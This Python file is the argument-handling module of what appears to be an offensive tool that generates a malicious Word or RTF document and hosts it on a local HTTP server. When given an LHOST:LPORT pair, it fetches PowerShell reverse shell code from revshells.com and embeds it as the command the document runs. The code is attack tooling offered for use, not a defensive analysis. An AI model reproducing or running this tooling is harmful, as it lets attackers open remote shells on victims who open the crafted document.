from manip_args import *
import requests
from utils import *
import sys


def eval_args(args):
    """Perform preliminary checks"""

    opt = dict()

    # Get command to execute. If both -c and -r options are set, the latter is used
    if args.reverse is None:
        opt['cmd'] = args.command
    else:
        pair = args.reverse.split(":")
        if (pair[0] == '' or pair[1] == ''):
            print(":x:", "[bold][red]Invalid LHOST:LPORT combination[/red]")
            sys.exit(-1)

        # Fetch Reverse Shell code from 0day's website
        opt['cmd'] = requests.get(
            f"https://www.revshells.com/PowerShell%20%233?ip={pair[0]}&port={pair[1]}"
        ).text

    # Get Output filename
    opt['output'] = args.output
    if(not (opt['output'].endswith(".doc") or
            opt['output'].endswith(".docx"))):
        print(":raised_hand:",
              "[bold][yellow]The output file does not end with .doc or .docx[/yellow]")

    # Check if IP and port is available for hosting server
    if (not check_ip_port(args.ip, args.port)):
        print(
            ":x:", f"[bold][red]Cannot start HTTP Server over {args.ip}:{args.port}")
        sys.exit(-2)
    opt['server_params'] = (args.ip, args. port)

    # Check if the document needs to be exported in RTF
    opt['rtf'] = args.rtf
    print(":spiral_notepad:", f"Output File: [cyan]{opt['output']}[/cyan]")
    if opt['rtf']:
        print(":memo:", f"RTF mode: [magenta]ON[/magenta]")
    print(
        ":link:", f"Starting HTTP Server over: {opt['server_params'][0]}:{opt['server_params'][1]}")
    print(":computer:", f"Command: [green]{opt['cmd']}[/green]")
    return
